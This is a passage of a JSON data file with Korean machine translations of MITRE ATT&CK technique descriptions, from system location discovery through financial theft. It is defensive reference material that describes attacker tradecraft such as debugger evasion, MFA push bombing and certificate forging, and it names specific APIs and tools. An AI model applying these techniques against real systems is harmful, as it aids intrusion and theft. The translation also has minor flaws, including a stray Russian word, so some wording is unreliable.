      "description": "위협 행위자는 피해 호스트의 지리적 위치를 계산하기 위해 정보를 수집할 수 있습니다. 위협 행위자는 [시스템 위치 탐지](https://attack.mitre.org/techniques/T1614)에서 얻은 정보를 자동화된 탐지 과정에서 활용하여 후속 행동을 설계하며, 여기에는 위협 행위자가 목표를 완전히 감염시키는지 여부와 특정 작업을 시도하는지가 포함됩니다.\n\n위협 행위자는 시간대, 키보드 레이아웃 및/또는 언어 설정과 같은 다양한 시스템 체크를 통해 시스템의 위치를 추론하려고 할 수 있습니다. (출처: FBI Ragnar Locker 2020)(출처: Sophos Geolocation 2016)(출처: Bleepingcomputer RAT 악성코드 2020) Windows API 함수인 <code>GetLocaleInfoW</code>를 사용하여 호스트의 로케일을 결정할 수도 있습니다. (출처: FBI Ragnar Locker 2020) 클라우드 환경에서는 인스턴스의 가용성 영역을 인스턴스 메타데이터 서비스에 접근하여 발견할 수 있습니다. (출처: AWS Instance Identity Documents)(출처: Microsoft Azure Instance Metadata 2021)\n\n위협 행위자는 또한 온라인 지리적 위치 IP 조회 서비스와 같은 IP 주소를 사용하여 피해 호스트의 위치를 추론하려고 할 수 있습니다. (출처: Securelist Trasparent Tribe 2020)(출처: Sophos Geolocation 2016)",
      "external_id": "T1614",
      "modified": "2024-10-15T16:07:23.511Z",
      "title": "System Location Discovery",
      "translated": true
    },
    {
      "description": "해당 적대자는 피해자의 시스템 언어에 대한 정보를 수집하려 할 수 있으며, 이를 통해 해당 호스트의 지리적 위치를 추론할 수 있습니다. 이 정보는 적대자가 특정 조치를 시도하거나 감염 여부를 결정하는 등의 후속 행동을 형성하는 데 사용될 수 있습니다. 이러한 결정은 악성코드 개발자와 운영자가 특정 법 집행 기관의 주목을 받거나 다른 기관으로부터 기소/조사를 받는 위험을 줄이기 위해 사용될 수 있습니다. (인용: 악성코드 시스템 언어 확인)\n\n적대자가 시스템 언어를 추론하는 데 사용할 수 있는 다양한 데이터 출처가 있으며, 여기에는 시스템 기본값과 키보드 레이아웃이 포함됩니다. 특정 점검 방법은 대상이나 적대자에 따라 다르게 나타날 수 있지만, [레지스트리 쿼리](https://attack.mitre.org/techniques/T1012)와 [네이티브 API](https://attack.mitre.org/techniques/T1106) 함수 호출과 같은 행동이 포함될 수 있습니다. (인용: CrowdStrike Ryuk 2019년 1월)\n\n예를 들어, Windows 시스템에서 적대자는 레지스트리 키 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code>를 쿼리하거나 Windows API 함수 <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code>, <code>GetUserDefaultLangID</code>의 출력을 파싱하여 시스템 언어를 추론하려 할 수 있습니다. (인용: Darkside 랜섬웨어 Cybereason)(인용: Securelist JSWorm)(인용: SecureList SynAck Dopplegänging 2018년 5월)\n\nmacOS 또는 Linux 시스템에서 적대자는 <code>locale</code>를 쿼리하여 <code>$LANG</code> 환경 변수의 값을 검색할 수 있습니다.",
      "external_id": "T1614.001",
      "modified": "2021-10-15T22:00:56.174Z",
      "title": "System Language Discovery",
      "translated": true
    },
    {
      "description": "공격자는 권한 상승 경로를 식별하고 도메인 내에서 적용된 보안 조치를 파악하며, 조작하거나 환경에 어울리게 사용할 수 있는 도메인 객체의 패턴을 발견하기 위해 그룹 정책 설정에 대한 정보를 수집할 수 있습니다. 그룹 정책은 Active Directory(AD)에서 사용자 및 컴퓨터 설정을 중앙 집중식으로 관리할 수 있게 해줍니다. 그룹 정책 객체(GPO)는 예측 가능한 네트워크 경로 `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`에 저장된 파일로 구성된 그룹 정책 설정의 컨테이너입니다.(출처: TechNet 그룹 정책 기본 사항)(출처: ADSecurity GPO 지속성 2016)\n\n공격자는 `<code>gpresult</code>`와 같은 명령어 또는 `<code>Get-DomainGPO</code>`와 `<code>Get-DomainGPOLocalGroup</code>`와 같은 다양한 공개적으로 사용할 수 있는 PowerShell 함수들을 사용하여 그룹 정책 설정에 대한 정보를 수집할 수 있습니다.(출처: Microsoft gpresult)(출처: Github PowerShell Empire) 공격자는 이 정보를 이용하여 후속 행동을 조정하며, 목표 네트워크 내에서의 잠재적인 공격 경로를 결정하고 그룹 정책 설정을 자신에게 유리하게 조작할 기회를 찾는 데 사용할 수 있습니다 (예: [도메인 또는 테넌트 정책 수정](https://attack.mitre.org/techniques/T1484)).",
      "external_id": "T1615",
      "modified": "2023-01-06T12:41:08.579Z",
      "title": "Group Policy Discovery",
      "translated": true
    },
    {
      "description": "적대자는 클라우드 저장소 인프라에서 객체를 열거할 수 있습니다. 적대자는 이 정보를 자동화된 탐색 과정에서 활용하여 후속 행동을 형성할 수 있으며, 여기에는 클라우드 저장소에서 모든 객체 또는 특정 객체를 요청하는 것이 포함됩니다. 로컬 호스트의 [파일 및 디렉토리 검색](https://attack.mitre.org/techniques/T1083)과 유사하게, 사용할 수 있는 저장소 서비스를 식별한 후(즉, [클라우드 인프라 탐색](https://attack.mitre.org/techniques/T1580)), 적대자는 클라우드 인프라에 저장된 콘텐츠/객체에 접근할 수 있습니다.\n\n클라우드 서비스 제공업체는 사용자가 클라우드 저장소에 저장된 객체를 열거할 수 있도록 API를 제공합니다. 예를 들어 AWS에서는 ListObjectsV2(인용: ListObjectsV2)와 Azure에서는 List Blobs(인용: List Blobs)가 있습니다.",
      "external_id": "T1619",
      "modified": "2022-04-11T22:29:43.677Z",
      "title": "Cloud Storage Object Discovery",
      "translated": true
    },
    {
      "description": "적대자는 악성 페이로드의 실행을 숨기기 위해 프로세스에 코드를 반사적으로 로드할 수 있습니다. 반사적 로딩은 페이로드를 디스크의 파일 경로에 의해 백업된 스레드나 프로세스를 생성하는 대신 프로세스의 메모리 내에서 직접 할당한 다음 실행하는 것을 포함합니다.\n\n반사적으로 로드된 페이로드는 컴파일된 바이너리, 익명 파일(오직 RAM에만 존재) 또는 파일 없는 실행 코드의 조각(예: 위치 독립적인 쉘코드)일 수 있습니다. 예를 들어, [PowerShell](https://attack.mitre.org/techniques/T1059/001)에서 실행된 `Assembly.Load()` 메서드는 실행 중인 프로세스에 원시 코드를 로드하기 위해 악용될 수 있습니다.\n\n반사적 코드 주입은 [프로세스 주입](https://attack.mitre.org/techniques/T1055)과 매우 유사하지만 \"주입\"이 별도의 프로세스의 메모리가 아닌 프로세스 자체의 메모리에 코드를 로드한다는 점이 다릅니다. 반사적 로딩은 임의 코드의 실행이 합법적이거나 그렇지 않은 무해한 프로세스 내에서 마스킹될 수 있기 때문에 프로세스 기반 탐지를 회피할 수 있습니다. 메모리에 페이로드를 반사적으로 로드함으로써 디스크에 파일이나 기타 아티팩트를 생성하는 것을 피할 수 있으며, 악성 코드가 실행될 때까지 이러한 페이로드를 암호화(또는 그렇지 않으면 혼란스럽게) 유지할 수 있게 됩니다.",
      "external_id": "T1620",
      "modified": "2024-02-09T18:49:08.428Z",
      "title": "Reflective Code Loading",
      "translated": true
    },
    {
      "description": "상대방은 다단계 인증(MFA) 메커니즘을 우회하려 시도하고 사용자에게 전송된 MFA 요청을 생성하여 계정에 접근할 수 있습니다.\n\n상대방이 [유효한 계정](https://attack.mitre.org/techniques/T1078)에 대한 자격 증명을 보유하고 있더라도, 추가적인 자격 증명 및 보안 제어로 요구되는 2FA 또는 MFA 메커니즘에 접근할 수 없다면 로그인 프로세스를 완료할 수 없습니다. 이를 우회하기 위해 상대방은 Duo Push, Microsoft Authenticator, Okta 또는 유사한 서비스와 같은 MFA 서비스에 대한 푸시 알림의 자동 생성을 악용하여 사용자가 자신의 계정에 대한 접근을 허용하도록 유도할 수 있습니다. 만약 상대방이 피해자 계정의 자격 증명을 보유하고 있지 않다면, 자가 서비스 비밀번호 재설정(SSPR)을 위해 이 옵션이 구성되어 있을 때 자동 푸시 알림 생성을 악용할 수 있습니다. (출처: Obsidian SSPR Abuse 2023)\n\n일부 경우, 상대방은 로그인 시도를 지속적으로 반복하여 사용자에게 MFA 푸시 알림, SMS 메시지 및 전화 통화를 폭격하여 궁극적으로 사용자가 \"MFA 피로\"에 대한 반응으로 인증 요청을 수락하도록 만들 수 있습니다. (출처: 러시아 2FA 푸시 공격 - Cimpanu)(출처: MFA 피로 공격 - PortSwigger)(출처: 전 세계 정부 및 기업을 대상으로 한 의심스러운 러시아 활동)",
      "external_id": "T1621",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Multi-Factor Authentication Request Generation",
      "translated": true
    },
    {
      "description": "공격자는 디버거를 탐지하고 회피하기 위해 다양한 수단을 사용할 수 있습니다. 디버거는 일반적으로 방어자가 잠재적인 악성 코드 페이로드의 실행을 추적하거나 분석하는 데 사용됩니다. (출처: ProcessHacker Github)\n\n디버거 회피는 디버그된 환경을 나타내는 아티팩트의 존재 여부에 대한 검사 결과에 따라 행동을 변경하는 것을 포함할 수 있습니다. [가상화/샌드박스 회피](https://attack.mitre.org/techniques/T1497)와 유사하게, 공격자가 디버거를 감지하면 악성 코드를 변경하여 피해자와의 연결을 끊거나 임플란트의 핵심 기능을 숨길 수 있습니다. 그들은 또한 추가 페이로드를 배포하기 전에 디버거 아티팩트를 탐색할 수도 있습니다.\n\n특정 검사는 목표와/또는 공격자에 따라 달라질 수 있지만, [네이티브 API](https://attack.mitre.org/techniques/T1106) 함수 호출인 <code>IsDebuggerPresent()</code> 및 <code>NtQueryInformationProcess()</code>와 같은 호출이나 프로세스 환경 블록(PEB)의 <code>BeingDebugged</code> 플래그를 수동으로 확인하는 것을 포함할 수 있습니다. 디버깅 아티팩트에 대한 다른 검사도 하드웨어 중단점, 어셈블리 명령어 중단, 시간 검사 또는 현재 프로세스에서 예외가 발생하는 경우의 측정을 열거하려고 할 수 있습니다(현재 디버거가 \"소화\"하거나 잠재적인 오류를 처리할 것이라고 가정). (출처: hasherezade debug)(출처: AlKhaser Debug)(출처: vxunderground debug)\n\n공격자는 이러한 디버거 검사로부터 배운 정보를 자동화된 탐색 과정에서 후속 행동을 형성하는 데 사용할 수 있습니다. 디버거는 프로세스를 분리하거나 반복하는 [네이티브 API](https://attack.mitre.org/techniques/T1106) 함수 호출인 <code>OutputDebugStringW()</code>를 통한 무의미한 데이터로 디버그 로그를 채워 회피할 수도 있습니다. (출처: wardle evilquest partii)(출처: Checkpoint Dridex Jan 2021)",
      "external_id": "T1622",
      "modified": "2022-04-16T15:05:55.918Z",
      "title": "Debugger Evasion",
      "translated": true
    },
    {
      "description": "적대 세력은 plist 파일(속성 목록 파일)을 수정하여 다른 악의적인 활동을 가능하게 하고, 시스템 방어를 회피하거나 우회할 수 있습니다. macOS 애플리케이션은 `info.plist` 파일과 같은 plist 파일을 사용하여 애플리케이션의 속성 및 구성 설정을 저장하여 운영 체제가 실행 시 애플리케이션을 어떻게 처리할지에 대한 정보를 제공합니다. plist 파일은 Apple의 Core Foundation DTD를 기반으로 XML 형식으로 구성된 메타데이터로, 키-값 쌍의 구조를 가집니다. plist 파일은 텍스트 또는 이진 형식으로 저장될 수 있습니다.(출처: fileinfo plist file 설명)\n\n적대 세력은 plist 파일 내의 키-값 쌍을 수정하여 시스템 동작에 영향을 미칠 수 있으며, 예를 들어 애플리케이션의 실행을 숨기거나(예: [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) 추가 명령을 실행하여 지속성을 확보할 수 있습니다(예: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) 또는 [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).\n\n예를 들어, 적대 세력은 `~/Library/Preferences/com.apple.dock.plist` 파일에 악의적인 애플리케이션 경로를 추가하여 도크에 나타나는 앱을 제어할 수 있습니다. 적대 세력은 또한 애플리케이션의 `info.plist` 파일에 있는 <code>LSUIElement</code> 키를 수정하여 애플리케이션을 백그라운드에서 실행하도록 할 수 있습니다. 또한 적대 세력은 키-값 쌍을 삽입하여 환경 변수를 설정하고, 예를 들어 <code>LSEnvironment</code>를 사용하여 [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006)을 통해 지속성을 활성화할 수 있습니다.(출처: wardle chp2 persistence)(출처: eset_osx_flashback)",
      "external_id": "T1647",
      "modified": "2022-04-20T22:00:33.375Z",
      "title": "Plist File Modification",
      "translated": true
    },
    {
      "description": "적대자는 서버리스 컴퓨팅, 통합 및 자동화 서비스를 악용하여 클라우드 환경에서 임의의 코드를 실행할 수 있습니다. 많은 클라우드 제공업체는 컴퓨팅 엔진, 애플리케이션 통합 서비스 및 웹 서버를 포함한 다양한 서버리스 리소스를 제공합니다.\n\n적대자는 차단된 명령어를 실행하기 위한 수단으로 이러한 리소스를 다양하게 악용할 수 있습니다. 예를 들어, 적대자는 서버리스 기능을 사용하여 암호화폐 채굴 악성 코드와 같은 악성 코드를 실행할 수 있습니다(자세한 내용은 [자원 탈취](https://attack.mitre.org/techniques/T1496) 참조). 또한, 적대자는 클라우드 환경의 추가 손상을 가능하게 하는 기능을 만들 수도 있습니다. 예를 들어, 적대자는 AWS의 `IAM:PassRole` 권한이나 Google Cloud의 `iam.serviceAccounts.actAs` 권한을 사용하여 서버리스 클라우드 기능에 [추가 클라우드 역할](https://attack.mitre.org/techniques/T1098/003)을 추가할 수 있으며, 이 기능은 원래 사용자가 할 수 없는 작업을 수행할 수 있게 됩니다.\n\n서버리스 기능은 클라우드 이벤트에 응답하여 호출될 수도 있습니다(예: [이벤트 트리거 실행](https://attack.mitre.org/techniques/T1546)), 이는 시간이 지나도 지속적인 실행을 가능하게 합니다. 예를 들어, AWS 환경에서 적대자는 새로운 사용자가 생성될 때마다 호출되는 자동으로 [추가 클라우드 자격 증명](https://attack.mitre.org/techniques/T1098/001)을 사용자에게 추가하는 Lambda 함수를 만들고, этой 함수 호출을 위해 CloudWatch 이벤트 규칙을 설정할 수 있습니다. 이는 많은 클라우드 기반 오피스 애플리케이션 모음에서도 가능합니다. 예를 들어, Microsoft 365 환경에서는 적대자가 사용자가 문서에 대한 액세스 권한을 부여받을 때마다 모든 이메일을 전달하거나 익명 공유 링크를 생성하는 Power Automate 워크플로를 생성할 수 있습니다. Google Workspace 환경에서는 사용자가 파일을 열 때 사용자의 데이터를 외부로 유출하는 Apps Script를 만들 수 있습니다.",
      "external_id": "T1648",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Serverless Execution",
      "translated": true
    },
    {
      "description": "대적 세력은 원격 시스템이나 리소스에 접근하기 위해 인증에 사용되는 인증서를 도용하거나 위조할 수 있습니다. 디지털 인증서는 종종 메시지 및/또는 파일을 서명하고 암호화하는 데 사용됩니다. 인증서는 또한 인증 자료로 사용됩니다. 예를 들어, Entra ID 장치 인증서와 Active Directory 인증서 서비스(AD CS) 인증서는 특정 식별자와 연동되어 도메인 계정의 자격 증명으로 사용될 수 있습니다.(출처: O365 블로그 Azure AD 장치 ID)(출처: Microsoft AD CS 개요)\n\n인증 인증서는 도용되거나 위조될 수 있습니다. 예를 들어, AD CS 인증서는 암호화된 저장소(레지스트리 또는 파일)에서 도용되거나, 잘못된 인증서 파일(즉, [안전하지 않은 자격 증명](https://attack.mitre.org/techniques/T1552))에 있거나, 다양한 암호화 API를 통해 Windows 인증서 저장소에서 직접 접근할 수 있습니다.(출처: SpecterOps Certified Pre Owned)(출처: GitHub CertStealer)(출처: GitHub GhostPack Certificates) 적절한 등록 권한이 있는 사용자 및/또는 장치는 기업 인증서 기관(CA)으로부터 인증서를 요청하거나 수동으로 갱신할 수도 있습니다. 이 등록 프로세스는 인증서와 관련된 다양한 설정 및 권한을 정의합니다. 특히, 인증서의 연장 키 사용(EKU) 값은 서명, 암호화 및 인증 사용 사례를 정의하며, 인증서의 주체 대체 이름(SAN) 값은 인증서 소유자의 대체 이름을 정의합니다.(출처: Medium Certified Pre Owned)\n\n인증 자격 증명으로 인증서를 악용하면 [측면 이동](https://attack.mitre.org/tactics/TA0008)과 같은 다른 행동을 할 수 있습니다. 인증서와 관련된 잘못된 구성은 사용자가 인증서와 관련된 식별자를 통해 권한이 있는 계정이나 권한을 가장하거나 가정할 수 있게 하여 [특권 상승](https://attack.mitre.org/tactics/TA0004)의 기회를 제공할 수도 있습니다. 이러한 악용은 인증서의 유효 기간 동안 사용자 비밀번호 재설정에도 불구하고 [유효한 계정](https://attack.mitre.org/techniques/T1078)으로 사용될 수 있는 인증서를 도용하거나 위조함으로써 [지속성](https://attack.mitre.org/tactics/TA0003)을 가능하게 할 수도 있습니다. 인증 인증서는 또한 머신 계정을 위해 도용되고 위조될 수 있습니다.\n\n루트(또는 하위) CA 인증서 개인 키(또는 이러한 키를 보호/관리하는 메커니즘)에 접근할 수 있는 대적 세력은 피해 도메인에 대해 임의의 인증서(일명 \"골든\" 인증서)를 위조함으로써 [지속성](https://attack.mitre.org/tactics/TA0003)을 설정할 수 있습니다.(출처: Medium Certified Pre Owned) 대적 세력은 또한 인증서와 관련된 서비스를 타겟팅하여 [골든 티켓](https://attack.mitre.org/techniques/T1558/001) 티켓 부여 티켓(TGT)이나 NTLM 평문과 같은 다른 형태의 자격 증명에 접근할 수 있습니다.(출처: Medium Certified Pre Owned)",
      "external_id": "T1649",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Steal or Forge Authentication Certificates",
      "translated": true
    },
    {
      "description": "적대자는 목표 시스템이나 네트워크에 대한 기존 접근 권한을 구매하거나 기타 방법으로 획득할 수 있습니다. 여러 온라인 서비스 및 초기 접근 브로커 네트워크가 이전에 손상된 시스템에 대한 접근를 판매하고 있습니다. (인용: Microsoft 랜섬웨어 서비스)(인용: CrowdStrike 접근 브로커)(인용: Krebs 접근 브로커 포춘 500) 일부 경우, 적대자 그룹은 서로 손상된 시스템을 공유하기 위한 파트너십을 형성할 수 있습니다. (인용: CISA 카라쿠르트 2022)\n\n손상된 시스템에 대한 발판은 심어진 백도어에 대한 접근(예: [웹 셸](https://attack.mitre.org/techniques/T1505/003)) 또는 [외부 원격 서비스](https://attack.mitre.org/techniques/T1133)를 통한 기존 접근과 같은 다양한 형태로 나타날 수 있습니다. 경우에 따라 접근 브로커는 손상된 시스템에 “로드”를 주입하여 유료 고객을 위해 추가 맬웨어를 설치하는 데 사용할 수 있습니다. (인용: Microsoft 랜섬웨어 서비스)\n\n기존의 접근 브로커 네트워크를 활용함으로써 자신만의 초기 접근 능력을 개발하거나 획득하는 것보다, 적대자는 목표 네트워크에서 발판을 마련하는 데 필요한 자원을 줄이고 나중의 손상 단계에 더 집중할 수 있는 잠재력을 갖습니다. 적대자는 보안 모니터링이 부족하거나 고급 권한을 가진 시스템, 또는 특정 섹터에 속하는 조직의 시스템에 대한 접근을 우선적으로 획득할 수 있습니다. (인용: Microsoft 랜섬웨어 서비스)(인용: CrowdStrike 접근 브로커)\n\n일부 경우, IT 계약, 소프트웨어 개발 또는 통신과 같은 분야의 조직에 대한 접근을 구매함으로써 적대자는 [신뢰할 수 있는 관계](https://attack.mitre.org/techniques/T1199), [다단계 인증 가로채기](https://attack.mitre.org/techniques/T1111) 또는 심지어 [공급망 손상](https://attack.mitre.org/techniques/T1195)을 통해 추가적인 피해자를 손상시킬 수 있습니다.\n\n**참고:** 이 기술은 [기술 데이터 구매](https://attack.mitre.org/techniques/T1597/002) 및 [자격 증명](https://attack.mitre.org/techniques/T1589/001)과 같은 다른 행동과는 구별되지만, 종종 함께 사용될 수 있습니다(특히 acquired foothold가 [유효한 계정](https://attack.mitre.org/techniques/T1078) 필요할 경우).",
      "external_id": "T1650",
      "modified": "2023-04-14T20:04:42.893Z",
      "title": "Acquire Access",
      "translated": true
    },
    {
      "description": "위협 행위자는 클라우드 관리 서비스를 악용하여 가상 머신 내에서 명령을 실행할 수 있습니다. AWS Systems Manager, Azure RunCommand 및 Runbooks와 같은 리소스를 사용하면 사용자가 설치된 가상 머신 에이전트를 활용하여 가상 머신에서 원격으로 스크립트를 실행할 수 있습니다. (출처: AWS Systems Manager Run Command)(출처: Microsoft Run Command)\n\n만약 위협 행위자가 클라우드 환경에 대한 관리 액세스 권한을 획득하게 되면, 클라우드 관리 서비스를 악용하여 해당 환경의 가상 머신에서 명령을 실행할 수 있습니다. 또한, 서비스 제공업체 또는 위임된 관리 계정을 침해한 위협 행위자는 연결된 가상 머신에서 명령을 실행하기 위해 [신뢰할 수 있는 관계](https://attack.mitre.org/techniques/T1199)를 활용할 수 있습니다. (출처: MSTIC Nobelium Oct 2021)",
      "external_id": "T1651",
      "modified": "2024-10-15T13:42:42.543Z",
      "title": "Cloud Administration Command",
      "translated": true
    },
    {
      "description": "공격자는 피해자의 호스트에서 로컬 장치 드라이버를 열거하려고 시도할 수 있습니다. 장치 드라이버에 대한 정보는 호스트의 기능/목적, 현재 보안 도구(예: [보안 소프트웨어 검색](https://attack.mitre.org/techniques/T1518/001)) 또는 기타 방어 수단(예: [가상화/샌드박스 회피](https://attack.mitre.org/techniques/T1497)), 그리고 잠재적으로 악용 가능한 취약성(예: [특권 상승을 위한 악용](https://attack.mitre.org/techniques/T1068))에 대한 여러 통찰력을 제공할 수 있습니다.\n\n많은 운영 체제 유틸리티는 `driverquery.exe`와 Windows의 `EnumDeviceDrivers()` API 함수와 같이 로컬 장치 드라이버에 대한 정보를 제공할 수 있습니다.(출처: Microsoft Driverquery)(출처: Microsoft EnumDeviceDrivers) 장치 드라이버에 대한 정보(및 관련 서비스, 즉 [시스템 서비스 검색](https://attack.mitre.org/techniques/T1007))는 레지스트리에서도 확인할 수 있습니다.(출처: Microsoft Registry Drivers)\n\nLinux/macOS에서는 커널 모듈 형태의 장치 드라이버가 `/dev` 내에서 또는 `lsmod` 및 `modinfo`와 같은 유틸리티를 사용하여 확인할 수 있습니다.(출처: Linux Kernel Programming)(출처: lsmod 매뉴얼)(출처: modinfo 매뉴얼)",
      "external_id": "T1652",
      "modified": "2023-05-04T18:07:16.804Z",
      "title": "Device Driver Discovery",
      "translated": true
    },
    {
      "description": "공격자는 감염된 시스템에 대한 접근을 연장하기 위해 시스템이 잠자기, 재부팅 또는 종료하는 기능을 방해할 수 있습니다. 컴퓨터가 잠재적 상태에 들어가면 일부 또는 모든 소프트웨어와 하드웨어가 작동을 멈출 수 있으며, 이는 악의적인 활동을 방해할 수 있습니다.(출처: Sleep, shut down, hibernate)\n\n공격자는 시스템 유틸리티 및 구성 설정을 남용하여 기계가 악의적인 활동을 종료할 수 있는 대기 모드와 같은 상태에 들어가는 것을 방지함으로써 접근을 유지할 수 있습니다.(출처: Microsoft: Powercfg command-line options)(출처: systemdsleep Linux)\n\n예를 들어, `powercfg`는 Windows 시스템의 모든 구성 가능한 전원 시스템 설정을 제어하며 감염된 호스트가 잠기거나 종료되는 것을 방지하기 위해 남용될 수 있습니다.(출처: Two New Monero Malware Attacks Target Windows and Android Users) 공격자는 또한 시스템 잠금 화면 타임아웃 설정을 연장할 수 있습니다.(출처: BATLOADER: The Evasive Downloader Malware) 디스크 및 하이버네이트 타임아웃과 같은 기타 관련 설정도 유사하게 남용되어 사용자가 활동하지 않는 경우에도 감염된 머신이 계속 운영되도록 할 수 있습니다.(출처: CoinLoader: A Sophisticated Malware Loader Campaign)\n\n일부 악성코드가 시스템 재부팅을 견디지 못한다는 사실을 알고 있는 공격자는 시스템 종료 또는 재부팅을 유도하는 데 사용되는 파일을 완전히 삭제할 수 있습니다.(출처: Condi-Botnet-binaries)",
      "external_id": "T1653",
      "modified": "2024-10-16T20:11:40.334Z",
      "title": "Power Settings",
      "translated": true
    },
    {
      "description": "적대자는 시스템 및 서비스 로그를 열람하여 유용한 데이터를 찾을 수 있습니다. 이러한 로그는 적대자에게 사용자 인증 기록([계정 탐색](https://attack.mitre.org/techniques/T1087)), 보안 또는 취약한 소프트웨어([소프트웨어 탐색](https://attack.mitre.org/techniques/T1518)), 혹은 손상된 네트워크 내의 호스트([원격 시스템 탐색](https://attack.mitre.org/techniques/T1018))와 같은 다양한 종류의 귀중한 통찰력을 강조할 수 있습니다.\n\n호스트 바이너리는 시스템 로그를 수집하는 데 활용될 수 있습니다. 예를 들어, Windows에서 `wevtutil.exe` 또는 [PowerShell](https://attack.mitre.org/techniques/T1059/001)을 사용하여 보안 이벤트 정보를 접근 및/또는 내보내는 방식이 있습니다. (인용: WithSecure Lazaurus-NoPineapple 위협 인텔 보고서 2023) (인용: Cadet Blizzard 새로운 위협 행위자가 등장함) 클라우드 환경에서는 적대자가 Azure VM Agent의 `CollectGuestLogs.exe`와 같은 유틸리티를 활용하여 클라우드 호스팅 인프라에서 보안 로그를 수집할 수 있습니다. (인용: SIM 스와핑 및 Microsoft Azure 직렬 콘솔의 남용)\n\n적대자는 SIEM과 같은 중앙 집중식 로깅 인프라를 목표로 삼을 수도 있습니다. 로그는 대량으로 내보내져서 적대자가 제어하는 인프라로 전송되어 오프라인 분석에 사용될 수 있습니다.\n\n환경에 대한 더 나은 이해를 얻는 것 외에도, 적대자는 실시간으로 로그를 모니터링하여 사건 대응 절차를 추적할 수 있습니다. 이는 그들이 지속성을 유지하거나 방어를 회피하기 위해 기법을 조정할 수 있게 해줄 수 있습니다. (인용: Permiso GUI-Vil 2023)",
      "external_id": "T1654",
      "modified": "2024-10-15T12:24:40.892Z",
      "title": "Log Enumeration",
      "translated": true
    },
    {
      "description": "공격자는 신뢰할 수 있는 개인이나 조직을 가장하여 대상을 설득하고 속여 그들의 대리로서 어떤 행동을 수행하게 만들 수 있습니다. 예를 들어, 공격자는 알려진 발신자(예: 경영진, 동료 또는 제3자 공급업체)를 가장하여 피해자와 소통할 수 있습니다. 그렇게 구축된 신뢰를 활용하여 공격자의 궁극적인 목표를 달성할 수 있으며, 그로 인해 여러 피해자가 영향을 받을 수 있습니다.\n\n사업자 이메일 사기나 이메일 사기 캠페인이 발생하는 많은 경우, 공격자는 사기를 위해 가장을 사용하여 피해자가 돈을 송금하거나 최종적으로 [재정 절도](https://attack.mitre.org/techniques/T1657)를 가능하게 하는 정보를 누출하도록 속입니다.\n\n공격자는 또한 '지급', '요청' 또는 '긴급'과 같은 조작적이고 설득적인 언어를 이메일 제목 및 본문에 사용하여 피해자가 악의적인 활동이 감지되기 전에 신속하게 행동하도록 압박하는 사회공학 기법을 자주 사용합니다. 이러한 캠페인은 종종 직무 역할 및 접근 권한으로 인해 공격자의 목표를 수행할 수 있는 사람들을 특정 대상으로 삼습니다.\n\n가장은 일반적으로 [피해자 신원 정보 수집](https://attack.mitre.org/techniques/T1589) 및 [피해자 조직 정보 수집](https://attack.mitre.org/techniques/T1591)과 같은 정찰 기법과 이메일 도메인(즉, [도메인](https://attack.mitre.org/techniques/T1583/001))과 같은 인프라를 확보하여 그들의 허위 신원을 입증하는 것으로 선행됩니다.(인용: CrowdStrike-BEC)\n\n가장과 관련된 캠페인에서는 여러 피해자가 생길 가능성이 있습니다. 예를 들어, 공격자가 하나의 조직을 목표로 [계정 탈취](https://attack.mitre.org/techniques/T1586)를 진행하면, 그 계정을 사용하여 다른 기관에 대한 가장을 지원할 수 있습니다.(인용: VEC)",
      "external_id": "T1656",
      "modified": "2024-10-15T15:59:06.382Z",
      "title": "Impersonation",
      "translated": true
    },
    {
      "description": "적대자들은 피해자의 자원 가용성을 희생하면서 자신의 재정적 이득을 목적으로 extortion, 사회공학, 기술적 절도 또는 기타 방법을 통해 목표로부터 금전적 자원을 훔칠 수 있습니다. 금전적 절도는 랜섬웨어에 의한 extortion(인용: FBI-ransomware), 비즈니스 이메일 사기(BEC) 및 사기(인용: FBI-BEC), \"돼지 도살\"(인용: wired-pig butchering), 은행 해킹(인용: DOJ-DPRK Heist), 그리고 암호화폐 네트워크 악용(인용: BBC-Ronin)등 여러 인기 있는 캠페인 유형의 궁극적인 목표입니다.\n\n적대자들은 [계정 해킹](https://attack.mitre.org/techniques/T1586)을 통해 권한 없는 자금 이체를 수행할 수 있습니다(인용: 인터넷 범죄 보고서 2022). 비즈니스 이메일 사기나 이메일 사기의 경우, 적대자는 신뢰할 수 있는 개체를 [사칭](https://attack.mitre.org/techniques/T1656)하여 이용할 수 있습니다. 사회공학이 성공을 거두면, 피해자는 적대자가 통제하는 금융 계정으로 금전을 송금하도록 속을 수 있습니다(인용: FBI-BEC). 이는 금전적 절개 사건에 연루된 여러 피해자가 발생할 가능성을 생성합니다(즉, 해킹된 계정뿐만 아니라 궁극적인 금전적 손실)(인용: VEC).\n\n랜섬웨어에 의한 extortion이 발생할 수 있는 예로는, 적대자가 [영향을 위한 데이터 암호화](https://attack.mitre.org/techniques/T1486) 후(인용: NYT-Colonial) 데이터 [유출](https://attack.mitre.org/tactics/TA0010)을 요구한 다음, 금액을 지급하지 않으면 민감한 데이터를 대중에게 유출하겠다고 위협하는 경우가 있을 수 있습니다(인용: Mandiant-leaks). 적대자들은 피해자 데이터를 배포하기 위해 전용 유출 사이트를 사용할 수 있습니다(인용: Crowdstrike-leaks).\n\n금전적 절도의 잠재적인 막대한 비즈니스 영향으로 인해, 적대자는 금전적 이득 추구를 통해 재정적 절도의 가능성을 남용하여 [데이터 파괴](https://attack.mitre.org/techniques/T1485) 및 비즈니스 중단과 같은 진정한 목표에서 주의를 분산시킬 수 있습니다(인용: AP-NotPetya).",
      "external_id": "T1657",
      "modified": "2024-10-15T15:58:10.254Z",
      "title": "Financial Theft",
      "translated": true
    },
    {
